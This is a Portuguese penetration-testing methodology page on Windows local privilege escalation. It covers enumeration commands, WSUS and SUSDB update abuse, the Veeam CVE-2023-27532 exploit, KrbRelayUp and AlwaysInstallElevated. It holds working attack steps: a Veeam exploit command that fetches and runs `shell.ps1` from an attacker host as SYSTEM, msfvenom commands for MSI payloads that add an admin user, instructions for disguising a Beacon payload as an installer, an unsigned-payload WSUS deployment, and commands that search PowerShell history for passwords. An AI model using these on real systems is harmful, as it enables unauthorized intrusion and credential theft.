# Escalação local de privilégios no Windows

{{#include ../../banners/hacktricks-training.md}}

### **Melhor ferramenta para procurar vetores de escalação local de privilégios no Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Esta página reúne a metodologia geral de escalação de privilégios no Windows de vários guias fundamentais.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Seu fluxo prático de enumeração também se baseia em workshops e listas de verificação da comunidade.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> O material histórico sobre ataques inclui a apresentação da DerbyCon sobre escalação de privilégios no Windows.<sup>[[5]](#references)</sup>

## Teoria inicial do Windows

### Access Tokens

**Se você não sabe o que são tokens de acesso do Windows, leia a página a seguir antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulte a página a seguir para obter mais informações sobre ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Níveis de integridade

**Se você não sabe o que são níveis de integridade no Windows, leia a página a seguir antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controles de segurança do Windows

Há diferentes recursos no Windows que podem **impedir que você enumere o sistema**, execute arquivos executáveis ou até mesmo **detecte suas atividades**. Você deve **ler** a **página** a seguir e **enumerar** todos esses **mecanismos de defesa** antes de iniciar a enumeração para escalação de privilégios:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

O acesso físico também pode transformar uma edição offline do UEFI NVRAM em DMA pré-inicialização e em uma cadeia de alteração da memória do Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Proteção de administrador / elevação silenciosa de UIAccess

Processos UIAccess iniciados por meio de `RAiLaunchAdminProcess` podem ser abusados para alcançar High IL sem prompts quando as verificações de caminho seguro do AppInfo são contornadas. Consulte aqui o fluxo de trabalho dedicado para contornar UIAccess/Proteção de administrador:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

A propagação do registro de acessibilidade do Secure Desktop pode ser abusada para realizar uma gravação arbitrária no registro como SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Versões recentes do Windows também introduziram um vetor de LPE **SMB arbitrary-port**, no qual uma autenticação NTLM local privilegiada é refletida por meio de uma conexão TCP SMB reutilizada:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informações do sistema

### Enumeração de informações da versão

Verifique se há alguma vulnerabilidade conhecida na versão do Windows (verifique também os patches aplicados).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits de versão

Este [site](https://msrc.microsoft.com/update-guide/vulnerability) é útil para pesquisar informações detalhadas sobre vulnerabilidades de segurança da Microsoft. Esse banco de dados contém mais de 4.700 vulnerabilidades de segurança, mostrando a **enorme superfície de ataque** que um ambiente Windows apresenta.

**No sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inventaria a compilação do SO, as atualizações instaladas e possíveis advisories selecionados; verifique o produto exato e as atualizações substitutivas antes de considerar um resultado aplicável.

Para um exploit local específico de uma versão, verifique a **arquitetura do processo em execução** e também a arquitetura do SO. No Windows de 64 bits, um processo de 32 bits está sujeito ao [redirecionamento do sistema de arquivos WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` normalmente aponta para o diretório de sistema de 32 bits, enquanto `%windir%\Sysnative` dá a esse processo acesso ao diretório de sistema nativo. O alias não está disponível para um processo de 64 bits. Uma compilação do SO ou um possível KB ausente não comprova que o sistema é explorável; compare a compilação em execução, a atualização instalada ou substitutiva, a arquitetura do processo e os pré-requisitos do exploit com o [boletim de segurança da Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) referente ao problema exato.

**Localmente, com informações do sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repositórios do GitHub com exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Há alguma credencial/informação juicy salva nas variáveis de ambiente?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Histórico do PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Arquivos de transcrição do PowerShell

Você pode aprender como ativar isso em [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` é apenas um exemplo. A [política de transcrição do PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalmente grava os arquivos na pasta Documentos de cada usuário, mas uma configuração `OutputDirectory` ou `Start-Transcript -OutputDirectory` pode redirecioná-los para uma pasta compartilhada ou oculta. Verifique o caminho de saída efetivo e as ACLs do arquivo antes de revisar uma transcrição: ela pode conter argumentos de comandos e saídas, incluindo credenciais. Uma transcrição legível é apenas uma pista, a menos que seu conteúdo revele uma identidade com privilégios mais altos que possa fazer logon no contexto relevante.

### PowerShell Module Logging

Os detalhes das execuções do pipeline do PowerShell são registrados, incluindo comandos executados, invocações de comandos e partes dos scripts. No entanto, talvez não sejam registrados todos os detalhes da execução nem os resultados de saída.

Para habilitar esse recurso, siga as instruções da seção "Transcript files" da documentação, escolhendo **"Module Logging"** em vez de **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Para visualizar os últimos 15 eventos dos logs do PowerShell, você pode executar:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Um registro completo da atividade e de todo o conteúdo da execução do script é capturado, garantindo que cada bloco de código seja documentado à medida que é executado. Esse processo preserva uma trilha de auditoria abrangente de cada atividade, valiosa para a análise forense e a análise de comportamentos maliciosos. Ao documentar toda a atividade no momento da execução, são fornecidas informações detalhadas sobre o processo.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Os eventos de logging do Script Block podem ser encontrados no Visualizador de Eventos do Windows, no caminho: **Logs de Aplicativos e Serviços > Microsoft > Windows > PowerShell > Operacional**.\
Para visualizar os últimos 20 eventos, você pode usar:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Configurações da Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Unidades

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Um endpoint HTTP do WSUS é um indício para investigar a interceptação de metadados de atualização. A exploração também depende de o cliente usar esse servidor WSUS, de um atacante poder interceptar ou controlar o tráfego e da política de confiança e instalação de atualizações do cliente. A URL, por si só, não comprova a execução de código. [A Microsoft recomenda TLS para os metadados do WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Comece verificando se a rede usa uma atualização WSUS sem SSL, executando o seguinte no cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ou o seguinte no PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Se você receber uma resposta como uma destas:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` for igual a `1`.

Quando `UseWUServer` é `1`, o serviço de intranet configurado é usado pelo Windows Update. Isso confirma um pré-requisito para o caminho de interceptação HTTP, mas não prova que a interceptação, a aceitação de atualizações maliciosas ou a instalação com privilégios elevados sejam possíveis. Quando é `0`, esse endpoint WSUS configurado não é selecionado por essa política.

Para explorar essas vulnerabilidades, você pode usar ferramentas como [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — scripts de exploits weaponized de MiTM para injetar atualizações 'falsas' em tráfego WSUS não SSL.

Leia a pesquisa aqui:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Leia o relatório completo aqui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Basicamente, esta é a falha explorada por esse bug:

> Se tivermos permissão para modificar o proxy do nosso usuário local, e o Windows Updates usar o proxy configurado nas definições do Internet Explorer, teremos permissão para executar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nosso próprio tráfego e executar código como um usuário com privilégios elevados no nosso ativo.
>
> Além disso, como o serviço WSUS usa as definições do usuário atual, também usará o repositório de certificados dele. Se gerarmos um certificado autoassinado para o hostname do WSUS e adicionarmos esse certificado ao repositório de certificados do usuário atual, poderemos interceptar o tráfego WSUS HTTP e HTTPS. O WSUS não usa mecanismos semelhantes ao HSTS para implementar uma validação do tipo trust-on-first-use para o certificado. Se o certificado apresentado for confiável para o usuário e tiver o hostname correto, será aceito pelo serviço.

Você pode explorar esta vulnerabilidade usando a ferramenta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (quando for liberada).

### Atualizações do WSUS controladas pelo administrador

Existe um caminho separado quando a identidade atual pode **publicar e aprovar** atualizações em um servidor WSUS. Verifique a associação efetiva ao grupo `WSUS Administrators` do servidor e todas as permissões delegadas do WSUS; em seguida, identifique o grupo de computadores cliente que receberia uma atualização aprovada. [A Microsoft exige privilégios de administrador do WSUS para aprovar atualizações](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) e [documenta a relação de confiança de publicação](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): os clientes precisam confiar no certificado de assinatura usado para o conteúdo publicado localmente. Confirme que a atualização candidata está assinada e é aceita, aplicável ao alvo e instalada em um contexto com mais privilégios antes de considerar isso um caminho de escalada. Um valor HTTP `WUServer` ou um nome de grupo, por si só, não comprova essas condições.

### Abuso de atualizações personalizadas do SUSDB: payloads não assinados via `.txt`/`.esd`

Este é um caso diferente de violação de limite de confiança da interceptação de uma conexão HTTP do WSUS: o pré-requisito é ter acesso suficiente aos **procedimentos armazenados do banco de dados WSUS (`SUSDB`)** para publicar e aprovar uma atualização personalizada. Um caminho prático de entrada é retransmitir a conta de computador de um WSUS upstream para um servidor MSSQL separado que hospeda o `SUSDB`; o pré-requisito exato depende da implantação, portanto, primeiro enumere as permissões `EXECUTE`, em vez de presumir que sejam necessárias permissões de administrador SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Para o caminho de ataque separado que retransmite a autenticação de clientes WSUS de HTTP/8530 para LDAP, SMB ou AD CS, consulte [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Criar, direcionar e aprovar a atualização

O fluxo de trabalho de atualização personalizada usa procedimentos WSUS legítimos como uma API restrita de publicação. As transições de estado importantes são:<sup>[[38]](#references)</sup>

| Etapa | Procedimentos armazenados relevantes |
| --- | --- |
| Importar metadados da atualização | `spImportUpdate` |
| Armazenar fragmentos XML de pré-requisitos, localizados e estendidos | `spSaveXMLFragment` |
| Associar o digest do conteúdo à URL controlada pelo atacante | `spSetBatchURL` |
| Enumerar/criar um grupo de computadores e adicionar o cliente | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Aprovar a instalação para esse grupo | `spDeployUpdate` com `@actionID = 0` e `@isAssigned = 1` |

O nome do arquivo, os digests, o tamanho e o handler `CommandLineInstallation` precisam estar de acordo nos metadados e fragmentos importados. Depois de atribuir a URL do conteúdo e o grupo de destino, a aprovação final se parece com o exemplo a seguir; use identificadores novos de atualização, grupo e implantação em vez de reutilizar os GUIDs de exemplo.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

O WSUS normalmente rejeita conteúdo executável arbitrário sem assinatura. No entanto, em `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, o caminho `.NET` `VerifyFile` define como false o sinalizador de verificação de certificado quando o nome de arquivo fornecido termina em `.txt` ou `.esd`; assim, `CheckCertificateSignature` é ignorado sem antes confirmar que os bytes são texto ou uma imagem ESD legítima. Portanto, um PE inalterado chamado, por exemplo, `payload.exe.txt` pode passar pela verificação de conteúdo e, posteriormente, ser executado pelo manipulador de instalação de linha de comando da atualização. Isso é um bug de confusão de política/tipo, não uma falsificação de assinatura.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging e automação compatíveis com BITS

Chamar `spDeployUpdate` faz com que o WSUS busque o conteúdo registrado. A origem precisa atender às expectativas HTTP do BITS: uma URL acessível, por si só, não basta, pois a transferência usa um fluxo inicial de `HEAD`/`GET` e solicitações de intervalo de bytes. Um servidor sem suporte a Range gera o evento de sincronização do WSUS `EventId=364`, informando que o BITS requer o cabeçalho de protocolo Range.<sup>[[39]](#references)</sup>

O PoC de pesquisa [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) gera o SQL necessário para a cadeia de importação/fragmento/URL/grupo/implantação, inclui um cliente MSSQL modificado para executá-lo e fornece `BitsWebServer.py` para preparar o conteúdo. Uma invocação mínima em um laboratório autorizado é:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Execução autônoma e persistência por novas tentativas

A interação do lado do cliente depende da política. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opção `4 - Auto download and schedule install`, faz com que uma atualização aprovada seja baixada e instalada conforme o cronograma configurado, sem que o usuário precise selecioná-la manualmente. Durante os testes, uma atualização cujo payload permanecia com falha/incompleto era oferecida novamente assim que o processo de callback terminava. Portanto, o comportamento de novas tentativas pode se tornar uma persistência de execução recorrente; isso gera ruído, pois o cliente exibe um estado de falha na atualização.<sup>[[39]](#references)</sup>

#### Pontos de detecção e hardening

Pontos úteis de análise no servidor e no cliente nesta cadeia:<sup>[[39]](#references)</sup>

- Audite a execução de `spCreateTargetGroup`, `spSetBatchURL` e `spDeployUpdate` em `SUSDB`; investigue novos grupos de direcionamento, origens de conteúdo externas, payloads de atualização `.txt`/`.esd` e implantações realizadas por principals inesperados (especialmente contas que não sejam de computador).
- Revise `C:\Program Files\Update Services\LogFiles` em busca de `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (com erro de grafia) e `EventId=364`; correlacione a verificação com a extensão do payload e a assinatura do conteúdo, em vez de confiar no sufixo.
- Procure instalações do Windows Update que falham e são repetidas continuamente, bem como execução de PE ou atividade inesperada de processos filhos/rede originada de conteúdo com nomes `.txt` ou `.esd`.
- Exija Extended Protection for Authentication no serviço de banco de dados, quando houver suporte, e restrinja o acesso de rede ao banco de dados ao servidor WSUS e aos sistemas administrativos autorizados. Minimize e audite os direitos `EXECUTE` nos procedimentos de atualização personalizados.

## Atualizadores automáticos de terceiros e IPC de agente (local privesc)

Muitos agentes corporativos expõem uma superfície de IPC em localhost e um canal de atualização privilegiado. Se o processo de inscrição puder ser induzido a se conectar a um servidor do atacante e o atualizador confiar em uma CA raiz maliciosa ou fizer verificações fracas do assinante, um usuário local poderá entregar um MSI malicioso que o serviço SYSTEM instala. Veja aqui uma técnica generalizada (baseada na cadeia do Netskope stAgentSvc – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam Backup & Replication e Cloud Connect usam um serviço central de backup em **TCP/9401 por padrão**. [O comunicado da Veeam](https://www.veeam.com/kb4424) descreve a divulgação não autenticada de credenciais criptografadas do banco de dados de configuração dentro do perímetro de rede de backup; um PoC público separado demonstra um caminho para execução de comandos como **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> O serviço pode fazer bind além de localhost; portanto, verifique o endereço e o PID efetivos.

- **Recon**: confirme que TCP/9401 pertence a `Veeam.Backup.Service.exe` e, em seguida, inspecione o produto instalado e os metadados de patch. `netstat -ano | findstr 9401` e `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` são indícios, mas não constituem uma verificação completa de patch.
- **Versões mínimas corrigidas**: a Veeam lista **11a build 11.0.1.1261 P20230227** e **12 build 12.0.0.1420 P20230223** como as primeiras versões corrigidas; versões anteriores são afetadas. Uma versão de arquivo com quatro componentes, por si só, não permite distinguir uma build base sem patch de um patch posterior com os mesmos números de build. Verifique o identificador do patch no [histórico de builds do fornecedor](https://www.veeam.com/kb2680) antes de considerar corrigida uma build limítrofe.
- **Exploração**: coloque um PoC como `VeeamHax.exe` no mesmo diretório que as DLLs necessárias da Veeam e, em seguida, dispare um payload SYSTEM pelo socket local:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

A PoC citada demonstra execução de comandos como SYSTEM quando seus pré-requisitos adicionais são atendidos; o comunicado do fornecedor descreve o problema de divulgação de credenciais.
## KrbRelayUp

Um relay local de Kerberos pode passar de um logon com menos privilégios para uma gravação privilegiada no diretório quando um servidor COM adequado se autentica e o principal retransmitido tem permissões no objeto de destino. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) gravações LDAP de RBCD e `msDS-KeyCredentialLink` (shadow-credential); o KrbRelayUp automatiza alguns desses caminhos. Uma cadeia de RBCD exige delegação aplicável e permissões no objeto de destino, enquanto uma cadeia de shadow-credential exige permissões para gravar credenciais de chave e um KDC que aceite o caminho de autenticação por certificado. Nenhum dos caminhos decorre apenas da associação ao domínio.

Verifique as políticas reais do DC para [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) e [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), a ACL do objeto para a identidade retransmitida e os níveis de autenticação e representação da classe COM selecionada. O tipo de logon do chamador e o contexto das credenciais são importantes: uma sessão WinRM pode se comportar de forma diferente de um logon interativo ou de um logon com novas credenciais. O roteamento de firewall/OXID e as atualizações instaladas também podem alterar o resultado. Trate uma política permissiva ou uma ACL correspondente como um ponto a ser revisado; a enumeração passiva não deve acionar coerção COM, autenticação por relay ou gravações no diretório. Uma shadow credential de conta de máquina pode levar a um ticket de máquina e, somente se essa conta tiver os direitos de replicação de diretório necessários, a um caminho separado de DCSync.

Encontre o **exploit em** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Para mais informações sobre o fluxo do ataque, consulte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Se** estas 2 chaves do Registro estiverem **habilitadas** (valor **0x1**), então usuários com qualquer nível de privilégio podem **instalar** (executar) arquivos `*.msi` como NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Se você tiver uma sessão meterpreter, poderá automatizar esta técnica usando o módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use o comando `Write-UserAddMSI` do power-up para criar, no diretório atual, um binário MSI do Windows para escalar privilégios. Este script grava um instalador MSI pré-compilado que solicita a adição de um usuário/grupo (portanto, você precisará de acesso à GUI):

```
Write-UserAddMSI
```

Basta executar o binário criado para escalar privilégios.

### MSI Wrapper

Leia este tutorial para aprender a criar um MSI wrapper usando estas ferramentas. Observe que você pode encapsular um arquivo "**.bat**" se quiser **apenas** **executar** **linhas de comando**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Criar MSI com WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Criar MSI com Visual Studio

- **Gere** com Cobalt Strike ou Metasploit um **novo payload TCP de Windows EXE** em `C:\privesc\beacon.exe`
- Abra o **Visual Studio**, selecione **Create a new project** e digite "installer" na caixa de pesquisa. Selecione o projeto **Setup Wizard** e clique em **Next**.
- Dê um nome ao projeto, como **AlwaysPrivesc**, use **`C:\privesc`** como local, selecione **place solution and project in the same directory** e clique em **Create**.
- Continue clicando em **Next** até chegar à etapa 3 de 4 (escolher os arquivos a incluir). Clique em **Add** e selecione o payload Beacon que você acabou de gerar. Em seguida, clique em **Finish**.
- Destaque o projeto **AlwaysPrivesc** no **Solution Explorer** e, em **Properties**, altere **TargetPlatform** de **x86** para **x64**.
  - Há outras propriedades que você pode alterar, como **Author** e **Manufacturer**, para fazer o aplicativo instalado parecer mais legítimo.
- Clique com o botão direito do mouse no projeto e selecione **View > Custom Actions**.
- Clique com o botão direito do mouse em **Install** e selecione **Add Custom Action**.
- Clique duas vezes em **Application Folder**, selecione o arquivo **beacon.exe** e clique em **OK**. Isso garante que o payload Beacon seja executado assim que o instalador for iniciado.
- Em **Custom Action Properties**, altere **Run64Bit** para **True**.
- Por fim, **compile**.
  - Se o aviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` for exibido, certifique-se de definir a plataforma como x64.

### Instalação do MSI

Para executar a **instalação** do arquivo `.msi` malicioso em **segundo plano:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Para realizar o exploit desta vulnerabilidade, você pode usar: _exploit/windows/local/always_install_elevated_

## Antivírus e detectores

### Configurações de auditoria

Essas configurações determinam o que está sendo **registrado**, então preste atenção.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

É interessante saber para onde os logs do Windows Event Forwarding são enviados.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** foi projetado para o **gerenciamento de senhas do Administrador local**, garantindo que cada senha seja **única, aleatória e atualizada regularmente** em computadores associados a um domínio. Essas senhas são armazenadas com segurança no Active Directory e só podem ser acessadas por usuários que receberam permissões suficientes por meio de ACLs, permitindo que visualizem as senhas de administrador local se estiverem autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se estiver ativo, **as senhas em texto simples são armazenadas no LSASS** (Local Security Authority Subsystem Service).\
[**Mais informações sobre o WDigest nesta página**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

A partir do **Windows 8.1**, a Microsoft introduziu uma proteção aprimorada para a Local Security Authority (LSA) para **bloquear** tentativas de processos não confiáveis de **ler sua memória** ou injetar código, protegendo ainda mais o sistema.\
[**Mais informações sobre LSA Protection aqui**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

O **Credential Guard** foi introduzido no **Windows 10**. Seu objetivo é proteger as credenciais armazenadas em um dispositivo contra ameaças como ataques pass-the-hash. [**Mais informações sobre o Credential Guard estão disponíveis aqui.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Credenciais em cache

**Credenciais de domínio** são autenticadas pela **Local Security Authority** (LSA) e utilizadas pelos componentes do sistema operacional. Quando os dados de logon de um usuário são autenticados por um pacote de segurança registrado, normalmente são estabelecidas credenciais de domínio para esse usuário.\
[**Mais informações sobre credenciais em cache aqui**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Usuários e Grupos

### Enumerar Usuários e Grupos

Verifique se algum dos grupos aos quais você pertence tem permissões interessantes.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Grupos privilegiados

Se você **pertencer a algum grupo privilegiado, poderá escalar privilégios**. Saiba mais sobre grupos privilegiados e como abusar deles para escalar privilégios aqui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulação de tokens

**Saiba mais** sobre o que é um **token** nesta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulte a página a seguir para **saber mais sobre tokens interessantes** e como abusar deles:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuários conectados / Sessões

```bash
qwinsta
klist sessions
```

### Pastas pessoais

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Política de Senhas

```bash
net accounts
```

### Obter o conteúdo da área de transferência

```bash
powershell -command "Get-Clipboard"
```

## Processos em execução

### Permissões de arquivos e pastas

Antes de mais nada, ao listar os processos, **verifique se há senhas na linha de comando do processo**.\
